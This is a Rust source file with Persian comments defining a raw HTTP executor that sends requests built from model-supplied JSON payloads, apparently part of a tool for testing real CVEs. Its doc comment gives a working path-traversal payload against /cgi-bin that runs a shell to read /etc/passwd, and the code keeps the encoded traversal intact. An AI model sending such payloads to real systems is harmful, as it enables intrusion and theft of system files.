// src/executor/raw.rs
use std::collections::HashMap;
use std::time::Instant;

use async_trait::async_trait;
use serde_json::Value;

use crate::domain::{ExecutionOutcome, ExecutorError, TargetExecutor};

/// Executor برای CVEهای واقعی: هر متدی، هر pathی، هر bodyی.
///
/// Payload مورد انتظار از مدل:
/// ```json
/// {
///   "method": "POST",
///   "path":   "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
///   "body":   "echo Content-Type: text/plain; echo; cat /etc/passwd",
///   "headers": { "X-Foo": "bar" }
/// }
/// ```
///
/// `method`, `path` لازمند. `body` و `headers` اختیاری.
pub struct RawHttpExecutor {
    client: reqwest::Client,
    base_url: String,
    default_method: String,
    default_headers: Vec<(String, String)>,
}

impl RawHttpExecutor {
    pub fn new(
        base_url: impl Into<String>,
        default_method: impl Into<String>,
        default_headers: HashMap<String, String>,
    ) -> Self {
        let client = reqwest::Client::builder()
            .redirect(reqwest::redirect::Policy::none())
            .build()
            .expect("failed to build reqwest client for RawHttpExecutor");

        Self {
            client,
            base_url: base_url.into().trim_end_matches('/').to_string(),
            default_method: default_method.into(),
            default_headers: default_headers.into_iter().collect(),
        }
    }
}

#[async_trait]
impl TargetExecutor for RawHttpExecutor {
    async fn execute(&self, payload: &Value) -> Result<ExecutionOutcome, ExecutorError> {
        // ۱. path
        let path = payload
            .get("path")
            .and_then(|v| v.as_str())
            .ok_or_else(|| ExecutorError::InvalidPayload("missing 'path' field".into()))?;

        // ۲. method — از payload، وگرنه default
        let method = payload
            .get("method")
            .and_then(|v| v.as_str())
            .unwrap_or(&self.default_method)
            .to_uppercase();

        // ۳. body (اختیاری، فقط رشته)
        let body: Option<String> = payload
            .get("body")
            .and_then(|v| v.as_str())
            .map(String::from);

        // ۴. headers — از payload (اگه بود) merge با default
        let payload_headers: HashMap<String, String> = payload
            .get("headers")
            .and_then(|v| v.as_object())
            .map(|obj| {
                obj.iter()
                    .filter_map(|(k, v)| v.as_str().map(|s| (k.clone(), s.to_string())))
                    .collect()
            })
            .unwrap_or_default();

        // ۵. URL — مهم: path رو **دست‌نخورده** بذار تا %2e حفظ شه.
        //    reqwest/url عمداً percent-encoding موجود رو دوباره encode نمی‌کنه.
        let path = if path.starts_with('/') {
            path.to_string()
        } else {
            format!("/{}", path)
        };
        let url = format!("{}{}", self.base_url, path);

        // ۶. request builder
        let reqwest_method = reqwest::Method::from_bytes(method.as_bytes())
            .map_err(|e| ExecutorError::InvalidPayload(format!("invalid method '{}': {}", method, e)))?;

        let mut req = self.client.request(reqwest_method, &url);

        // ۷. headers
        for (k, v) in &self.default_headers {
            req = req.header(k, v);
        }
        for (k, v) in &payload_headers {
            req = req.header(k, v);
        }

        // ۸. body — فقط اگه هست
        if let Some(b) = body {
            req = req.body(b);
        }

        // ۹. send
        let start = Instant::now();
        let http_response = req
            .send()
            .await
            .map_err(|e| ExecutorError::Network(e.to_string()))?;

        let status_code = http_response.status().as_u16();
        let response_body = http_response
            .text()
            .await
            .map_err(|e| ExecutorError::Network(e.to_string()))?;

        let latency_ms = start.elapsed().as_millis() as u64;

        Ok(ExecutionOutcome {
            status_code,
            body: response_body,
            latency_ms,
        })
    }
}